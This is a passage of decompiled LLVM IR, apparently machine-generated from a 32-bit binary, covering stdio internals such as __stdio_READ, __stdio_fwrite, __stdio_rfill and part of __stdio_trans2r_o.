  %v1_804f17b = icmp eq i8* %arg1, null
  store i1 %v1_804f17b, i1* %zf.global-to-local, align 1
  br i1 %v1_804f17b, label %dec_label_pc_804f18a, label %dec_label_pc_804f17f

dec_label_pc_804f17f:                             ; preds = %entry
  %v12_804f17f = icmp eq i32 %v4_804f16b, %arg2
  store i1 %v12_804f17f, i1* %zf.global-to-local, align 1
  store i32 1, i32* %esi.global-to-local, align 4
  %v1_804f186 = icmp eq i1 %v12_804f17f, false
  br i1 %v1_804f186, label %dec_label_pc_804f1ad, label %dec_label_pc_804f1a7

dec_label_pc_804f18a:                             ; preds = %entry
  %v2_804f18a = ptrtoint i32* %stack_var_-32 to i32
  store i32 %v2_804f18a, i32* %edx.global-to-local, align 4
  store i1 false, i1* %zf.global-to-local, align 1
  br label %dec_label_pc_804f1ab

dec_label_pc_804f193:                             ; preds = %dec_label_pc_804f1bb
  %v1_804f193 = call i32 @__errno_location(i32 %v0_804f167)
  %v1_804f198 = inttoptr i32 %v1_804f193 to i32*
  store i32 84, i32* %v1_804f198, align 4
  br label %dec_label_pc_804f1e1

dec_label_pc_804f1a3:                             ; preds = %dec_label_pc_804f1c2
  store i1 true, i1* %zf.global-to-local, align 1
  store i32 0, i32* %ebx.global-to-local, align 4
  %v0_804f1d6.pre = load i32, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_804f1d2

dec_label_pc_804f1a7:                             ; preds = %dec_label_pc_804f17f
  %v2_804f1a7 = ptrtoint i32* %stack_var_-32 to i32
  store i32 %v2_804f1a7, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_804f1ab

dec_label_pc_804f1ab:                             ; preds = %dec_label_pc_804f18a, %dec_label_pc_804f1a7
  %v2_804f1c416 = phi i32 [ %v2_804f18a, %dec_label_pc_804f18a ], [ %v2_804f1a7, %dec_label_pc_804f1a7 ]
  %v1_804f1b012 = phi i32 [ -1, %dec_label_pc_804f18a ], [ %arg4, %dec_label_pc_804f1a7 ]
  store i1 true, i1* %zf.global-to-local, align 1
  store i32 0, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_804f1ad

dec_label_pc_804f1ad:                             ; preds = %dec_label_pc_804f17f, %dec_label_pc_804f1ab
  %v2_804f1c415 = phi i32 [ %v4_804f16b, %dec_label_pc_804f17f ], [ %v2_804f1c416, %dec_label_pc_804f1ab ]
  %v0_804f1b2 = phi i32 [ %arg4, %dec_label_pc_804f17f ], [ %v1_804f1b012, %dec_label_pc_804f1ab ]
  %v1_804f1ad = inttoptr i32 %arg2 to i32*
  %v2_804f1ad = load i32, i32* %v1_804f1ad, align 4
  store i32 %v2_804f1ad, i32* %ebx.global-to-local, align 4
  %tmp31 = icmp uge i32 %v0_804f1b2, %arg3
  %v5_804f1b4 = select i1 %tmp31, i32 %arg3, i32 %v0_804f1b2
  store i32 %v5_804f1b4, i32* %edi.global-to-local, align 4
  store i32 %v5_804f1b4, i32* @ecx, align 4
  %v1_804f1ce3 = icmp eq i32 %v5_804f1b4, 0
  store i1 %v1_804f1ce3, i1* %zf.global-to-local, align 1
  %v1_804f1d010 = icmp eq i1 %v1_804f1ce3, false
  br i1 %v1_804f1d010, label %dec_label_pc_804f1bb, label %dec_label_pc_804f1d2

dec_label_pc_804f1bb:                             ; preds = %dec_label_pc_804f1ad, %dec_label_pc_804f1c8
  %v2_804f1c4 = phi i32 [ %v2_804f1cb, %dec_label_pc_804f1c8 ], [ %v2_804f1c415, %dec_label_pc_804f1ad ]
  %v0_804f1bb = phi i32 [ %v1_804f1c8, %dec_label_pc_804f1c8 ], [ %v2_804f1ad, %dec_label_pc_804f1ad ]
  %v1_804f1bb = inttoptr i32 %v0_804f1bb to i32*
  %v2_804f1bb = load i32, i32* %v1_804f1bb, align 4
  %v9_804f1bd = icmp eq i32 %v2_804f1bb, 127
  store i1 %v9_804f1bd, i1* %zf.global-to-local, align 1
  %v6_804f1c0 = icmp ugt i32 %v2_804f1bb, 127
  br i1 %v6_804f1c0, label %dec_label_pc_804f193, label %dec_label_pc_804f1c2

dec_label_pc_804f1c2:                             ; preds = %dec_label_pc_804f1bb
  %v3_804f1c2 = trunc i32 %v2_804f1bb to i8
  %v4_804f1c2 = icmp eq i8 %v3_804f1c2, 0
  store i1 %v4_804f1c2, i1* %zf.global-to-local, align 1
  %v3_804f1c4 = inttoptr i32 %v2_804f1c4 to i8*
  store i8 %v3_804f1c2, i8* %v3_804f1c4, align 1
  %v0_804f1c6 = load i1, i1* %zf.global-to-local, align 1
  br i1 %v0_804f1c6, label %dec_label_pc_804f1a3, label %dec_label_pc_804f1c8

dec_label_pc_804f1c8:                             ; preds = %dec_label_pc_804f1c2
  %v0_804f1c8 = load i32, i32* %ebx.global-to-local, align 4
  %v1_804f1c8 = add i32 %v0_804f1c8, 4
  store i32 %v1_804f1c8, i32* %ebx.global-to-local, align 4
  %v0_804f1cb = load i32, i32* %edx.global-to-local, align 4
  %v1_804f1cb = load i32, i32* %esi.global-to-local, align 4
  %v2_804f1cb = add i32 %v1_804f1cb, %v0_804f1cb
  store i32 %v2_804f1cb, i32* %edx.global-to-local, align 4
  %v0_804f1cd = load i32, i32* @ecx, align 4
  %v1_804f1cd = add i32 %v0_804f1cd, -1
  %v8_804f1cd = icmp eq i32 %v1_804f1cd, 0
  store i32 %v1_804f1cd, i32* @ecx, align 4
  store i1 %v8_804f1cd, i1* %zf.global-to-local, align 1
  %v1_804f1d0 = icmp eq i1 %v8_804f1cd, false
  br i1 %v1_804f1d0, label %dec_label_pc_804f1bb, label %dec_label_pc_804f1d2

dec_label_pc_804f1d2:                             ; preds = %dec_label_pc_804f1c8, %dec_label_pc_804f1ad, %dec_label_pc_804f1a3
  %v0_804f1da = phi i32 [ 0, %dec_label_pc_804f1a3 ], [ %v2_804f1ad, %dec_label_pc_804f1ad ], [ %v1_804f1c8, %dec_label_pc_804f1c8 ]
  %v0_804f1d6 = phi i32 [ %v0_804f1d6.pre, %dec_label_pc_804f1a3 ], [ %v2_804f1c415, %dec_label_pc_804f1ad ], [ %v2_804f1cb, %dec_label_pc_804f1c8 ]
  %v2_804f1d2 = ptrtoint i32* %stack_var_-32 to i32
  %v12_804f1d6 = icmp eq i32 %v0_804f1d6, %v2_804f1d2
  store i1 %v12_804f1d6, i1* %zf.global-to-local, align 1
  br i1 %v12_804f1d6, label %dec_label_pc_804f1dd, label %dec_label_pc_804f1da

dec_label_pc_804f1da:                             ; preds = %dec_label_pc_804f1d2
  %v1_804f1da = load i32, i32* %ebp.global-to-local, align 4
  %v2_804f1da = inttoptr i32 %v1_804f1da to i32*
  store i32 %v0_804f1da, i32* %v2_804f1da, align 4
  br label %dec_label_pc_804f1dd

dec_label_pc_804f1dd:                             ; preds = %dec_label_pc_804f1d2, %dec_label_pc_804f1da
  %v0_804f1dd = load i32, i32* %edi.global-to-local, align 4
  %v1_804f1df = load i32, i32* @ecx, align 4
  %v2_804f1df = sub i32 %v0_804f1dd, %v1_804f1df
  %v12_804f1df = icmp eq i32 %v2_804f1df, 0
  br label %dec_label_pc_804f1e1

dec_label_pc_804f1e1:                             ; preds = %dec_label_pc_804f193, %dec_label_pc_804f1dd
  %storemerge = phi i1 [ %v12_804f1df, %dec_label_pc_804f1dd ], [ false, %dec_label_pc_804f193 ]
  %storemerge1 = phi i32 [ %v2_804f1df, %dec_label_pc_804f1dd ], [ -1, %dec_label_pc_804f193 ]
  store i1 %storemerge, i1* %zf.global-to-local, align 1
  %v0_804f1e1 = load i32, i32* @esp, align 4
  %v9_804f1e1 = icmp eq i32 %v0_804f1e1, -28
  store i1 %v9_804f1e1, i1* %zf.global-to-local, align 1
  store i32 %v0_804f167, i32* %ebx.global-to-local, align 4
  ret i32 %storemerge1

; uselistorder directives
  uselistorder i1 %v12_804f1d6, { 1, 0 }
  uselistorder i32 %v2_804f1cb, { 0, 2, 1 }
  uselistorder i32 %v1_804f1c8, { 0, 2, 1 }
  uselistorder i32 %v2_804f1bb, { 1, 2, 0 }
  uselistorder i32 %v2_804f1ad, { 1, 0, 2 }
  uselistorder i32 %v0_804f1b2, { 1, 0 }
  uselistorder i32 %v2_804f1c415, { 1, 0 }
  uselistorder i1 %v12_804f17f, { 1, 0 }
  uselistorder i32 %v4_804f16b, { 1, 0, 2 }
  uselistorder i1* %zf.global-to-local, { 0, 12, 1, 6, 3, 4, 5, 11, 7, 2, 8, 9, 10 }
  uselistorder i32* %esi.global-to-local, { 1, 0, 2 }
  uselistorder i32* %edx.global-to-local, { 0, 3, 1, 4, 2, 5 }
  uselistorder i32* %ebx.global-to-local, { 0, 1, 3, 4, 2 }
  uselistorder i32 -28, { 0, 2, 1 }
  uselistorder i32 127, { 2, 0, 5, 1, 4, 3 }
  uselistorder i1 true, { 2, 3, 0, 1, 4, 5, 6, 7 }
  uselistorder i32 84, { 3, 4, 0, 5, 1, 2 }
  uselistorder i8* null, { 5, 4, 6, 3, 2, 8, 0, 1, 7, 9, 10 }
  uselistorder i32 %arg3, { 1, 0 }
  uselistorder i32 %arg2, { 1, 0, 2 }
  uselistorder label %dec_label_pc_804f1e1, { 1, 0 }
  uselistorder label %dec_label_pc_804f1dd, { 1, 0 }
  uselistorder label %dec_label_pc_804f1bb, { 1, 0 }
  uselistorder label %dec_label_pc_804f1ad, { 1, 0 }
  uselistorder label %dec_label_pc_804f1ab, { 1, 0 }
}

define i32 @__stdio_READ(i16* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %ecx.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_804f1ec = load i32, i32* @ebx, align 4
  store i32 %v0_804f1ec, i32* %stack_var_-4, align 4
  store i32 0, i32* %ecx.global-to-local, align 4
  %v4_804f1f2 = ptrtoint i16* %arg1 to i32
  store i32 %v4_804f1f2, i32* @ebx, align 4
  %v1_804f1fa = bitcast i16* %arg1 to i8*
  %v2_804f1fa = load i8, i8* %v1_804f1fa, align 1
  %v3_804f1fa = and i8 %v2_804f1fa, 4
  %v4_804f1fa = icmp eq i8 %v3_804f1fa, 0
  %v1_804f1fd = icmp eq i1 %v4_804f1fa, false
  br i1 %v1_804f1fd, label %dec_label_pc_804f235, label %dec_label_pc_804f1ff

dec_label_pc_804f1ff:                             ; preds = %entry
  %v2_804f1ff = icmp slt i32 %arg3, 0
  %v3_804f206 = select i1 %v2_804f1ff, i32 2147483647, i32 %arg3
  %v1_804f20f = add i32 %v4_804f1f2, 4
  %v2_804f20f = inttoptr i32 %v1_804f20f to i32*
  %v3_804f20f = load i32, i32* %v2_804f20f, align 4
  %v4_804f212 = inttoptr i32 %arg2 to i32*
  %v5_804f212 = call i32 @__libc_read(i32 %v3_804f20f, i32* %v4_804f212, i32 %v3_804f206, i32 2147483647)
  store i32 %v5_804f212, i32* %ecx.global-to-local, align 4
  %tmp11 = icmp slt i32 %v5_804f212, 1
  %tmp12 = icmp eq i1 %tmp11, false
  br i1 %tmp12, label %dec_label_pc_804f235, label %dec_label_pc_804f221

dec_label_pc_804f221:                             ; preds = %dec_label_pc_804f1ff
  %v1_804f21a = icmp eq i32 %v5_804f212, 0
  %v4_804f21f = icmp eq i1 %v1_804f21a, false
  %v0_804f221 = load i32, i32* @ebx, align 4
  %v1_804f221 = inttoptr i32 %v0_804f221 to i32*
  %v2_804f221 = load i32, i32* %v1_804f221, align 4
  br i1 %v4_804f21f, label %dec_label_pc_804f22d, label %dec_label_pc_804f225

dec_label_pc_804f225:                             ; preds = %dec_label_pc_804f221
  %v1_804f225 = or i32 %v2_804f221, 4
  %v1_804f228 = trunc i32 %v1_804f225 to i16
  %v3_804f228 = inttoptr i32 %v0_804f221 to i16*
  store i16 %v1_804f228, i16* %v3_804f228, align 2
  br label %dec_label_pc_804f235

dec_label_pc_804f22d:                             ; preds = %dec_label_pc_804f221
  %v1_804f22d = or i32 %v2_804f221, 8
  store i32 0, i32* %ecx.global-to-local, align 4
  %v1_804f232 = trunc i32 %v1_804f22d to i16
  %v3_804f232 = inttoptr i32 %v0_804f221 to i16*
  store i16 %v1_804f232, i16* %v3_804f232, align 2
  br label %dec_label_pc_804f235

dec_label_pc_804f235:                             ; preds = %entry, %dec_label_pc_804f1ff, %dec_label_pc_804f225, %dec_label_pc_804f22d
  %v0_804f236 = load i32, i32* %ecx.global-to-local, align 4
  %v2_804f239 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_804f239, i32* @ebx, align 4
  ret i32 %v0_804f236

; uselistorder directives
  uselistorder i32 %v5_804f212, { 2, 0, 1 }
  uselistorder i32* %ecx.global-to-local, { 2, 1, 3, 0 }
  uselistorder i32 2147483647, { 0, 3, 1, 2, 4 }
  uselistorder i8 4, { 1, 0, 2 }
  uselistorder i16* %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_804f235, { 3, 2, 1, 0 }
}

define i32 @__stdio_fwrite(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ebp.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v0_804f23c = load i32, i32* @ebp, align 4
  %v0_804f23d = load i32, i32* @edi, align 4
  %v0_804f23e = load i32, i32* @esi, align 4
  %v0_804f23f = load i32, i32* @ebx, align 4
  store i32 %v0_804f23f, i32* %stack_var_-16, align 4
  store i32 %arg3, i32* @esi, align 4
  store i32 %arg1, i32* @ebp, align 4
  store i32 %arg2, i32* @edi, align 4
  %v1_804f24f = add i32 %arg3, 1
  %v2_804f24f = inttoptr i32 %v1_804f24f to i8*
  %v3_804f24f = load i8, i8* %v2_804f24f, align 1
  %v4_804f24f = and i8 %v3_804f24f, 2
  %v5_804f24f = icmp eq i8 %v4_804f24f, 0
  %v1_804f253 = icmp eq i1 %v5_804f24f, false
  br i1 %v1_804f253, label %dec_label_pc_804f304, label %dec_label_pc_804f259

dec_label_pc_804f259:                             ; preds = %entry
  %v1_804f259 = add i32 %arg3, 4
  %v2_804f259 = inttoptr i32 %v1_804f259 to i32*
  %v3_804f259 = load i32, i32* %v2_804f259, align 4
  %v13_804f259 = icmp eq i32 %v3_804f259, -2
  %v1_804f25d = add i32 %arg3, 16
  %v2_804f25d = inttoptr i32 %v1_804f25d to i32*
  %v3_804f25d = load i32, i32* %v2_804f25d, align 4
  store i32 %v3_804f25d, i32* @edx, align 4
  %v1_804f260 = add i32 %arg3, 12
  %v2_804f260 = inttoptr i32 %v1_804f260 to i32*
  %v3_804f260 = load i32, i32* %v2_804f260, align 4
  store i32 %v3_804f260, i32* %eax.global-to-local, align 4
  %v1_804f263 = icmp eq i1 %v13_804f259, false
  %v2_804f282 = sub i32 %v3_804f260, %v3_804f25d
  br i1 %v1_804f263, label %dec_label_pc_804f282, label %dec_label_pc_804f265

dec_label_pc_804f265:                             ; preds = %dec_label_pc_804f259
  %tmp = icmp uge i32 %v2_804f282, %arg2
  %v5_804f26c = select i1 %tmp, i32 %arg2, i32 %v2_804f282
  store i32 %v5_804f26c, i32* %ebx.global-to-local, align 4
  %v3_804f272 = inttoptr i32 %v3_804f25d to i16*
  %v4_804f272 = call i32 @memcpy(i16* %v3_804f272, i32 %v5_804f26c, i32 %v3_804f260)
  store i32 %v4_804f272, i32* %eax.global-to-local, align 4
  %v0_804f27a = load i32, i32* @esi, align 4
  %v1_804f27a = add i32 %v0_804f27a, 16
  %v2_804f27a = inttoptr i32 %v1_804f27a to i32*
  %v3_804f27a = load i32, i32* %v2_804f27a, align 4
  %v4_804f27a = load i32, i32* %ebx.global-to-local, align 4
  %v5_804f27a = add i32 %v4_804f27a, %v3_804f27a
  store i32 %v5_804f27a, i32* %v2_804f27a, align 4
  br label %dec_label_pc_804f31c

dec_label_pc_804f282:                             ; preds = %dec_label_pc_804f259
  store i32 %v2_804f282, i32* %eax.global-to-local, align 4
  %v6_804f286 = icmp ult i32 %v2_804f282, %arg2
  br i1 %v6_804f286, label %dec_label_pc_804f2eb, label %dec_label_pc_804f288

dec_label_pc_804f288:                             ; preds = %dec_label_pc_804f282
  %v0_804f288 = load i32, i32* @ecx, align 4
  %v3_804f28c = inttoptr i32 %v3_804f25d to i16*
  %v4_804f28c = call i32 @memcpy(i16* %v3_804f28c, i32 %arg2, i32 %v0_804f288)
  store i32 %v4_804f28c, i32* %eax.global-to-local, align 4
  %v0_804f294 = load i32, i32* @esi, align 4
  %v1_804f294 = add i32 %v0_804f294, 16
  %v2_804f294 = inttoptr i32 %v1_804f294 to i32*
  %v3_804f294 = load i32, i32* %v2_804f294, align 4
  %v4_804f294 = load i32, i32* @edi, align 4
  %v5_804f294 = add i32 %v4_804f294, %v3_804f294
  store i32 %v5_804f294, i32* %v2_804f294, align 4
  %v0_804f297 = load i32, i32* @esi, align 4
  %v1_804f297 = add i32 %v0_804f297, 1
  %v2_804f297 = inttoptr i32 %v1_804f297 to i8*
  %v3_804f297 = load i8, i8* %v2_804f297, align 1
  %v4_804f297 = urem i8 %v3_804f297, 2
  %v5_804f297 = icmp eq i8 %v4_804f297, 0
  br i1 %v5_804f297, label %dec_label_pc_804f31c, label %dec_label_pc_804f29d

dec_label_pc_804f29d:                             ; preds = %dec_label_pc_804f288
  %v0_804f29d = load i32, i32* @edx, align 4
  %v0_804f29e = load i32, i32* @edi, align 4
  %v4_804f2a2 = call i32 @memrchr(i8 10, i32 %v0_804f29e, i32 %v0_804f29d)
  store i32 %v4_804f2a2, i32* %eax.global-to-local, align 4
  %v1_804f2aa = icmp eq i32 %v4_804f2a2, 0
  br i1 %v1_804f2aa, label %dec_label_pc_804f31c, label %dec_label_pc_804f2ae

dec_label_pc_804f2ae:                             ; preds = %dec_label_pc_804f29d
  %v0_804f2b1 = load i32, i32* @esi, align 4
  %v1_804f2b2 = call i32 @__stdio_wcommit(i32 %v0_804f2b1)
  store i32 %v1_804f2b2, i32* %eax.global-to-local, align 4
  %v1_804f2ba = icmp eq i32 %v1_804f2b2, 0
  br i1 %v1_804f2ba, label %dec_label_pc_804f31c, label %dec_label_pc_804f2be

dec_label_pc_804f2be:                             ; preds = %dec_label_pc_804f2ae
  %v0_804f2be = load i32, i32* @edi, align 4
  %tmp20 = icmp ule i32 %v0_804f2be, %v1_804f2b2
  %v5_804f2c2 = select i1 %tmp20, i32 %v0_804f2be, i32 %v1_804f2b2
  store i32 %v5_804f2c2, i32* %ebx.global-to-local, align 4
  %v2_804f2c7 = sub i32 %v0_804f2be, %v5_804f2c2
  store i32 %v2_804f2c7, i32* %eax.global-to-local, align 4
  %v0_804f2c9 = load i32, i32* @ebp, align 4
  %v2_804f2c9 = add i32 %v0_804f2c9, %v2_804f2c7
  store i32 %v2_804f2c9, i32* %ebp.global-to-local, align 4
  %v4_804f2d0 = call i32 @__GI_memchr(i8* inttoptr (i32 10 to i8*), i32 %v5_804f2c2, i32 %v2_804f2c7)
  store i32 %v4_804f2d0, i32* %eax.global-to-local, align 4
  %v1_804f2d8 = icmp eq i32 %v4_804f2d0, 0
  store i32 %v4_804f2d0, i32* @edx, align 4
  br i1 %v1_804f2d8, label %dec_label_pc_804f31c, label %dec_label_pc_804f2de

dec_label_pc_804f2de:                             ; preds = %dec_label_pc_804f2be
  %v0_804f2de = load i32, i32* %ebp.global-to-local, align 4
  %v1_804f2de = load i32, i32* %ebx.global-to-local, align 4
  %v2_804f2de = sub i32 %v0_804f2de, %v4_804f2d0
  %v2_804f2e2 = add i32 %v2_804f2de, %v1_804f2de
  store i32 %v2_804f2e2, i32* %eax.global-to-local, align 4
  %v0_804f2e4 = load i32, i32* @esi, align 4
  %v1_804f2e4 = add i32 %v0_804f2e4, 16
  %v2_804f2e4 = inttoptr i32 %v1_804f2e4 to i32*
  %v3_804f2e4 = load i32, i32* %v2_804f2e4, align 4
  %v5_804f2e4 = sub i32 %v3_804f2e4, %v2_804f2e2
  store i32 %v5_804f2e4, i32* %v2_804f2e4, align 4
  %v0_804f2e7 = load i32, i32* @edi, align 4
  %v1_804f2e7 = load i32, i32* %eax.global-to-local, align 4
  %v2_804f2e7 = sub i32 %v0_804f2e7, %v1_804f2e7
  store i32 %v2_804f2e7, i32* @edi, align 4
  br label %dec_label_pc_804f31c

dec_label_pc_804f2eb:                             ; preds = %dec_label_pc_804f282
  %v2_804f2eb = add i32 %arg3, 8
  %v3_804f2eb = inttoptr i32 %v2_804f2eb to i32*
  %v4_804f2eb = load i32, i32* %v3_804f2eb, align 4
  %v15_804f2eb = icmp eq i32 %v3_804f25d, %v4_804f2eb
  br i1 %v15_804f2eb, label %dec_label_pc_804f304, label %dec_label_pc_804f2f0

dec_label_pc_804f2f0:                             ; preds = %dec_label_pc_804f2eb
  %v1_804f2f4 = call i32 @__stdio_wcommit(i32 %arg3)
  store i32 %v1_804f2f4, i32* %eax.global-to-local, align 4
  %v1_804f2fc = icmp eq i32 %v1_804f2f4, 0
  br i1 %v1_804f2fc, label %dec_label_pc_804f2f0.dec_label_pc_804f304_crit_edge, label %dec_label_pc_804f300

dec_label_pc_804f2f0.dec_label_pc_804f304_crit_edge: ; preds = %dec_label_pc_804f2f0
  %v0_804f304.pre = load i32, i32* @edi, align 4
  %v0_804f30c.pre = load i32, i32* @esi, align 4
  %v2_804f313.pre = load i32, i32* %stack_var_-16, align 4
  br label %dec_label_pc_804f304

dec_label_pc_804f300:                             ; preds = %dec_label_pc_804f2f0
  store i32 0, i32* @edi, align 4
  br label %dec_label_pc_804f31c

dec_label_pc_804f304:                             ; preds = %dec_label_pc_804f2f0.dec_label_pc_804f304_crit_edge, %dec_label_pc_804f2eb, %entry
  %v2_804f313 = phi i32 [ %v2_804f313.pre, %dec_label_pc_804f2f0.dec_label_pc_804f304_crit_edge ], [ %v0_804f23f, %dec_label_pc_804f2eb ], [ %v0_804f23f, %entry ]
  %v0_804f30c = phi i32 [ %v0_804f30c.pre, %dec_label_pc_804f2f0.dec_label_pc_804f304_crit_edge ], [ %arg3, %dec_label_pc_804f2eb ], [ %arg3, %entry ]
  %v0_804f304 = phi i32 [ %v0_804f304.pre, %dec_label_pc_804f2f0.dec_label_pc_804f304_crit_edge ], [ %arg2, %dec_label_pc_804f2eb ], [ %arg2, %entry ]
  store i32 %v2_804f313, i32* @ebx, align 4
  store i32 %v0_804f23d, i32* @edi, align 4
  %v4_804f317 = inttoptr i32 %v0_804f30c to i16*
  %v5_804f317 = call i32 @__stdio_WRITE(i16* %v4_804f317, i32 %v0_804f304, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v5_804f317, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804f31c

dec_label_pc_804f31c:                             ; preds = %dec_label_pc_804f2be, %dec_label_pc_804f2ae, %dec_label_pc_804f29d, %dec_label_pc_804f288, %dec_label_pc_804f300, %dec_label_pc_804f2de, %dec_label_pc_804f265, %dec_label_pc_804f304
  %v0_804f31f = load i32, i32* @edi, align 4
  store i32 %v0_804f31f, i32* %eax.global-to-local, align 4
  %v2_804f321 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_804f321, i32* @ebx, align 4
  store i32 %v0_804f23e, i32* @esi, align 4
  store i32 %v0_804f23d, i32* @edi, align 4
  store i32 %v0_804f23c, i32* @ebp, align 4
  ret i32 %v0_804f31f

; uselistorder directives
  uselistorder i32 %v2_804f2e2, { 1, 0 }
  uselistorder i32 %v0_804f2be, { 2, 1, 0 }
  uselistorder i32 %v1_804f2b2, { 1, 0, 2, 3 }
  uselistorder i32 %v2_804f282, { 2, 3, 1, 0 }
  uselistorder i32 %v3_804f25d, { 0, 1, 3, 2, 4 }
  uselistorder i32 %v0_804f23d, { 1, 0 }
  uselistorder i32* %stack_var_-16, { 1, 0, 2 }
  uselistorder i32* %eax.global-to-local, { 1, 0, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12 }
  uselistorder i32 ptrtoint (i32* @0 to i32), { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 31, 32, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 33, 34, 35, 36, 37, 38, 39, 40, 41 }
  uselistorder i8 10, { 11, 12, 10, 0, 1, 2, 3, 4, 5, 6, 7, 8, 9 }
  uselistorder i32 (i16*, i32, i32)* @memcpy, { 0, 1, 5, 6, 2, 3, 13, 4, 7, 8, 9, 14, 10, 11, 15, 16, 17, 12 }
  uselistorder i8 2, { 5, 13, 6, 1, 2, 3, 4, 0, 17, 14, 7, 8, 9, 10, 11, 15, 16, 12 }
  uselistorder i32 %arg3, { 0, 1, 2, 3, 5, 4, 6, 8, 7 }
  uselistorder i32 %arg2, { 2, 3, 4, 1, 5, 0, 6 }
  uselistorder label %dec_label_pc_804f31c, { 7, 4, 5, 0, 1, 2, 3, 6 }
}

define i32 @__stdio_rfill(i32 %arg1) local_unnamed_addr {
entry:
  %edx.global-to-local = alloca i32, align 4
  %v0_804f328 = load i32, i32* @ebx, align 4
  store i32 %arg1, i32* @ebx, align 4
  %v1_804f330 = add i32 %arg1, 8
  %v2_804f330 = inttoptr i32 %v1_804f330 to i32*
  %v3_804f330 = load i32, i32* %v2_804f330, align 4
  store i32 %v3_804f330, i32* %edx.global-to-local, align 4
  %v1_804f333 = add i32 %arg1, 12
  %v2_804f333 = inttoptr i32 %v1_804f333 to i32*
  %v3_804f333 = load i32, i32* %v2_804f333, align 4
  %v2_804f336 = sub i32 %v3_804f333, %v3_804f330
  %v3_804f33b = inttoptr i32 %arg1 to i16*
  %v4_804f33b = call i32 @__stdio_READ(i16* %v3_804f33b, i32 %v3_804f330, i32 %v2_804f336)
  %v0_804f340 = load i32, i32* @ebx, align 4
  %v1_804f340 = add i32 %v0_804f340, 8
  %v2_804f340 = inttoptr i32 %v1_804f340 to i32*
  %v3_804f340 = load i32, i32* %v2_804f340, align 4
  store i32 %v3_804f340, i32* %edx.global-to-local, align 4
  %v2_804f343 = add i32 %v0_804f340, 16
  %v3_804f343 = inttoptr i32 %v2_804f343 to i32*
  store i32 %v3_804f340, i32* %v3_804f343, align 4
  %v0_804f346 = load i32, i32* %edx.global-to-local, align 4
  %v2_804f346 = add i32 %v0_804f346, %v4_804f33b
  store i32 %v2_804f346, i32* %edx.global-to-local, align 4
  %v1_804f348 = load i32, i32* @ebx, align 4
  %v2_804f348 = add i32 %v1_804f348, 20
  %v3_804f348 = inttoptr i32 %v2_804f348 to i32*
  store i32 %v2_804f346, i32* %v3_804f348, align 4
  store i32 %v0_804f328, i32* @ebx, align 4
  ret i32 %v4_804f33b

; uselistorder directives
  uselistorder i32 %v4_804f33b, { 1, 0 }
  uselistorder i32 (i16*, i32, i32)* @__stdio_READ, { 1, 0 }
  uselistorder i32 %arg1, { 0, 3, 2, 1 }
}

define i32 @__stdio_trans2r_o(i16* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_-12 = alloca i32, align 4
  %v0_804f350 = load i32, i32* @ebx, align 4
  %v4_804f354 = ptrtoint i16* %arg1 to i32
  store i32 %v4_804f354, i32* @ebx, align 4
  %v2_804f35c = load i16, i16* %arg1, align 2
  %v3_804f35c = zext i16 %v2_804f35c to i32
  %v2_804f35f = and i32 %v3_804f35c, %arg2
  %v3_804f35f = icmp eq i32 %v2_804f35f, 0
  %v1_804f361 = icmp eq i1 %v3_804f35f, false
  br i1 %v1_804f361, label %dec_label_pc_804f36f, label %dec_label_pc_804f363

dec_label_pc_804f363:                             ; preds = %entry
  %v1_804f363 = and i32 %v3_804f35c, 2176
  %v2_804f363 = icmp eq i32 %v1_804f363, 0
  %v1_804f368 = icmp eq i1 %v2_804f363, false
  br i1 %v1_804f368, label %dec_label_pc_804f376, label %dec_label_pc_804f36a

dec_label_pc_804f36a:                             ; preds = %dec_label_pc_804f363
  %v2_804f36a = or i32 %v3_804f35c, %arg2
  %v1_804f36c = trunc i32 %v2_804f36a to i16
  store i16 %v1_804f36c, i16* %arg1, align 2
  %v0_804f36f.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_804f36f

dec_label_pc_804f36f:                             ; preds = %entry, %dec_label_pc_804f36a
  %v0_804f395 = phi i32 [ %v4_804f354, %entry ], [ %v0_804f36f.pre, %dec_label_pc_804f36a ]
  %v1_804f36f = inttoptr i32 %v0_804f395 to i16*
  %v2_804f36f = load i16, i16* %v1_804f36f, align 2
  %v2_804f372 = and i16 %v2_804f36f, 16
  %v3_804f372 = icmp eq i16 %v2_804f372, 0
  br i1 %v3_804f372, label %dec_label_pc_804f38e, label %dec_label_pc_804f376

dec_label_pc_804f376:                             ; preds = %dec_label_pc_804f36f, %dec_label_pc_804f363
  %v1_804f376 = call i32 @__errno_location(i32 %v0_804f350)
  %v1_804f37b = inttoptr i32 %v1_804f376 to i32*
  store i32 9, i32* %v1_804f37b, align 4
  br label %dec_label_pc_804f381

dec_label_pc_804f381:                             ; preds = %dec_label_pc_804f392, %dec_label_pc_804f376
  %v0_804f381 = load i32, i32* @ebx, align 4
  %v1_804f381 = inttoptr i32 %v0_804f381 to i32*
  %v2_804f381 = load i32, i32* %v1_804f381, align 4
  %v1_804f383 = or i32 %v2_804f381, 8
  %v1_804f386 = trunc i32 %v1_804f383 to i16
  %v3_804f386 = inttoptr i32 %v0_804f381 to i16*
  store i16 %v1_804f386, i16* %v3_804f386, align 2
  br label %dec_label_pc_804f3ba

dec_label_pc_804f38e:                             ; preds = %dec_label_pc_804f36f
  %v2_804f38e = and i16 %v2_804f36f, 64
  %v3_804f38e = icmp eq i16 %v2_804f38e, 0
  br i1 %v3_804f38e, label %dec_label_pc_804f3b0, label %dec_label_pc_804f392

dec_label_pc_804f392:                             ; preds = %dec_label_pc_804f38e
